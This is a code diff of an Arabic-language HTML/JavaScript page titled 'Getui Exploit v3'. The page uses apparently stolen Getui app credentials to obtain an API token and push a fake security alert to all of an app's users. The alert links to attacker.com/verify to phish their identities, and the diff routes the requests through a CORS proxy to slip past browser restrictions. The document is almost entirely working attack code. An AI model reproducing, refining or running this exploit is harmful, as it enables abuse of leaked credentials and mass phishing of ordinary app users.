@@ -2,10 +2,10 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>🔥 Getui Exploit</title>
+    <title>🔥 Getui Exploit v3</title>
 </head>
 <body>
-    <h1>🚀 Getui Exploit v2</h1>
+    <h1>🚀 Getui Exploit v3</h1>
     <button onclick="runExploit()">▶️ تشغيل الاستغلال</button>
     <pre id="output">⏳ انتظر...</pre>
 
@@ -24,6 +24,9 @@
         const BODY = "تم اكتشاف محاولة اختراق. يرجى تأكيد هويتك.";
         const CLICK_URL = "https://attacker.com/verify";
 
+        // ✅ Proxy لتجاوز CORS
+        const PROXY = "https://corsproxy.io/?";
+
         // ============================================================
         // 1️⃣ SHA256
         // ============================================================
@@ -33,15 +36,13 @@
         }
 
         // ============================================================
-        // 2️⃣ التوقيع الصحيح لـ Getui V2
+        // 2️⃣ الحصول على Token عبر Proxy
         // ============================================================
         async function getToken() {
             const timestamp = Date.now().toString();
-            
-            // ✅ التوقيع الصحيح: SHA256(appkey + timestamp + mastersecret)
             const raw = APP_KEY + timestamp + MASTER_SECRET;
             const sign = await sha256(raw);
-            
+
             const payload = {
                 appkey: APP_KEY,
                 timestamp: timestamp,
@@ -51,14 +52,14 @@
             log('📡 Payload: ' + JSON.stringify(payload, null, 2));
 
             try {
-                const res = await fetch(`https://api.getui.com/v2/${APP_ID}/auth`, {
+                const res = await fetch(`${PROXY}https://api.getui.com/v2/${APP_ID}/auth`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
                 const data = await res.json();
                 log('📨 Auth: ' + JSON.stringify(data, null, 2));
-                
+
                 if (data.code === 0 && data.data?.token) {
                     log('✅ Token: ' + data.data.token.slice(0,30) + '...');
                     return data.data.token;
@@ -73,7 +74,7 @@
         }
 
         // ============================================================
-        // 3️⃣ إرسال إشعار للجميع
+        // 3️⃣ إرسال إشعار عبر Proxy
         // ============================================================
         async function sendPushAll(token) {
             const payload = {
@@ -91,7 +92,7 @@
             };
 
             try {
-                const res = await fetch(`https://api.getui.com/v2/${APP_ID}/push/all`, {
+                const res = await fetch(`${PROXY}https://api.getui.com/v2/${APP_ID}/push/all`, {
                     method: 'POST',
                     headers: { 'token': token, 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
